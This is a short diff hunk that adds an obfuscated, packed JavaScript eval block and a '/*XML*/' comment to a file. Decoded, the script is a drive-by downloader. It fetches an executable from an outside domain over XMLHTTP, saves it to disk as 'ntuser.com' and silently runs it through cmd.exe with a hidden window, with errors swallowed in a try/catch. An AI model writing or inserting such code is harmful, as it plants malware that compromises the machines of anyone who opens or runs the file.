@@ -1,0 +1,3 @@
+eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('6 8="20://19.18.12/21.10";22{6 4=9.24("17.25","");4.14("15",8,0);4.16();3.13=1;3.11();3.23(4.34);5="..\\\\35.12";3.26(5,2);3.37();6 7=9.33("32.28","");7.27("29.10","/30 "+5,"","11",0)}31(36){}',10,38,'|||as|xml|path|var|shell|url|ado|exe|open|com|type|Open|GET|Send|Microsoft|gan360|n|http|0014|try|write|CreateObject|XMLHTTP|savetofile|ShellExecute|Application|cmd|c|catch|Shell|createobject|ResponseBody|ntuser|e|close'.split('|'),0,{}))
+
+/*XML*/
